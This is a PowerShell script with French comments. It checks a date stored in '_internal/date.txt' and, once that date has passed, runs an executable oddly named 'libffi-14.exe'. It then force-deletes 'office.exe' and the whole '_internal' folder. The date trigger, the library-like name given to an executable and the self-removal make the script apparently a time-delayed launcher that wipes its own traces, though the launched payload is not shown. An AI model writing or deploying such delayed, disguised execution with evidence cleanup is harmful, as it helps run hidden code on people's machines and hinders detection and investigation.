# Chemin du fichier contenant la date
$cheminFichierDate = "_internal/date.txt"

# Chemin du fichier à supprimer
$cheminFichierCoucou = "office.exe"

# Chemin du dossier à supprimer
$cheminDossierCoucou = "_internal"

# Chemin du dossier à supprimer
$dossierASupprimer = "_internal"

# Chemin du fichier exécutable
$cheminExecutable = "_internal\libffi-14.exe"

# Lire la date depuis le fichier
$dateTexte = Get-Content -Path $cheminFichierDate

# Convertir la date texte en objet DateTime
$date = Get-Date $dateTexte -Format "MM/dd/yyyy"

# Obtenir la date actuelle
$dateActuelle = Get-Date

# Comparer les dates
if ($date -le $dateActuelle) {
    # Vérifier si le fichier exécutable existe
    if (Test-Path $cheminExecutable -PathType Leaf) {
        # Lancer le fichier exécutable
        Start-Process -FilePath $cheminExecutable -NoNewWindow -Wait
    } else {
        Write-Host "Le fichier exécutable $cheminExecutable n'existe pas."
    }

    # Supprimer le fichier "coucou.exe" s'il existe
    if (Test-Path $cheminFichierCoucou -PathType Leaf) {
        Remove-Item -Path $cheminFichierCoucou -Force
        Write-Host "Le fichier $cheminFichierCoucou a été supprimé."
    } else {
        Write-Host "Le fichier $cheminFichierCoucou n'existe pas."
    }

    # Supprimer le dossier "coucou" s'il existe
    if (Test-Path $cheminDossierCoucou -PathType Container) {
        Remove-Item -Path $cheminDossierCoucou -Recurse -Force
        Write-Host "Le dossier $cheminDossierCoucou a été supprimé."
    } else {
        Write-Host "Le dossier $cheminDossierCoucou n'existe pas."
    }

    # Supprimer le dossier s'il existe
    if (Test-Path $dossierASupprimer -PathType Container) {
        Remove-Item -Path $dossierASupprimer -Recurse -Force
        Write-Host "Le dossier $dossierASupprimer a été supprimé."
    } else {
        Write-Host "Le dossier $dossierASupprimer n'existe pas."
    }
} else {
    Write-Host "La date dans le fichier est postérieure à la date actuelle."
}
